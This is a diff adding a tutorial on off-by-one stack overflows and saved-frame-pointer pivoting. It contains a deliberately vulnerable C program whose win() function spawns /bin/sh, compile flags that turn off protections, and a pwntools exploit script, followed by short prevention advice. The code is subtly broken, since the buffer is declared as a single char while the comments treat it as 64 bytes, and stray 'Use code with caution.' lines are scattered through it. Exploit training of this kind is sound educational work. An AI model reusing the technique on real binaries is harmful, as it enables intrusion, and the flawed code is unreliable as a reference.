@@ -1,1 +1,111 @@
+An Off-by-One vulnerability occurs when a loop or a string manipulation function writes exactly one byte past the allocated boundary of a buffer. This typically happens due to "fencepost errors," such as using <= instead of < in loop conditions, or miscalculating how functions like snprintf() or custom termination checks account for the null terminator (\0).
+While writing a single byte sounds negligible, if a buffer is located on the stack, that one byte allows an attacker to overwrite the lowest (least significant) byte of the adjacent Saved Frame Pointer (EBP/RBP). This triggers a structural vulnerability known as Frame Faking, dragging the execution stack pointer into an input buffer controlled by the user.
 
+1. The Vulnerable C Program (off_by_one.c)
+
+In this program, a developer tries to create a secure, bounded input loop. However, they make a subtle error in the loop condition, allowing the string to spill exactly one byte out of bounds.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Opening shell...\n");
+    system("/bin/sh");
+}
+
+void vulnerable_function() {
+    char buffer; // 64 bytes buffer
+    int i;
+
+    printf("Enter data: ");
+    
+    // VULNERABILITY: The loop runs 65 times (from 0 to 64 inclusive).
+    // Indices 0 to 63 fill the buffer. Index 64 writes one byte past the buffer!
+    for (i = 0; i <= 64; i++) {
+        char ch;
+        if (read(0, &ch, 1) <= 0) break;
+        if (ch == '\n') break;
+        buffer[i] = ch;
+    }
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vulnerable_function();
+    return 0;
+}
+Use code with caution.
+
+Compilation Flag
+
+To inspect this interaction cleanly without compiler padding variables moving the frame layouts, compile with stack protections off:
+bash
+gcc -m32 -fno-stack-protector -no-pie off_by_one.c -o off_by_one
+Use code with caution.
+
+2. The Mechanics: From 1 Byte to Total Control
+
+When vulnerable_function is executing, the stack is laid out sequentially. Right after the 64-byte buffer sits the 4-byte Saved EBP:
+text
+       Top of Stack (Lower Memory Address)
+       +------------------------------------+
+
+       |   buffer[0] ... buffer[63]         |  <-- 64 Bytes total space
+       +------------------------------------+
+
+       |   Saved EBP [LSB] [MSB]            |  <-- Index 64 overwrites ONLY the LSB!
+       +------------------------------------+
+
+       |   Return Address                   |
+       +------------------------------------+
+Use code with caution.
+By passing exactly 64 bytes of text followed by a single null byte (\0), index 64 overwrites the lowest byte of the Saved EBP, turning an address like 0xffffd048 into 0xffffd000.
+When the function naturally exits and executes leave, the CPU sets ESP to this corrupted EBP location (0xffffd000). If we have placed the address of our win() function at 0xffffd004, the program's natural execution flow will instantly jump straight to it.
+
+3. The Python Exploit Script (off_by_one.py)
+
+Using pwntools, we can craft the precise 65-byte payload. We place our target function address right at the front of our input buffer, pad out the rest of the text, and append the single corrupting byte.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize the binary process
+io = process('./off_by_one')
+
+# Static address of win() found via static analysis (e.g., objdump or GDB)
+win_address = p32(0x080491b6)
+
+# Build the payload layout:
+# 1. Place a fake return pointer right at the beginning of the buffer.
+#    We assume through debugging that our buffer starts at a 0x00 boundary.
+#    The first 4 bytes are consumed by 'pop ebp' during the pivot, the next 4 are the target.
+fake_frame = b"AAAA" + win_address
+
+# 2. Fill the remainder of the 64-byte buffer with padding characters
+padding = b"B" * (64 - len(fake_frame))
+
+# 3. The 65th byte (\x00) that triggers the off-by-one overwrite on Saved EBP
+corrupt_lsb = b"\x00"
+
+# Combine into the exact 65-byte payload
+payload = fake_frame + padding + corrupt_lsb
+
+# Fire the payload at the input prompt
+io.recvuntil(b"Enter data: ")
+log.info("Sending precise 65-byte off-by-one payload...")
+io.send(payload)
+
+# Interact with the spawned shell
+io.interactive()
+Use code with caution.
+
+4. How to Prevent Off-by-One Bugs
+
+Off-by-one logic slips are stopped by using standard, robust string boundary constraints rather than building custom byte loop counters:
+• Strict Array Index Bounds: Always ensure your loop boundary condition uses the strict less-than operator (<) relative to the buffer size, never less-than-or-equal-to (<=).
+• Use Safe Size Definitions: When referencing array lengths, consistently use the sizeof() macro or named constants to guarantee compliance:c
+// Secure loop bounds constraint
+for (i = 0; i < sizeof(buffer); i++) { ... }
+Use code with caution.
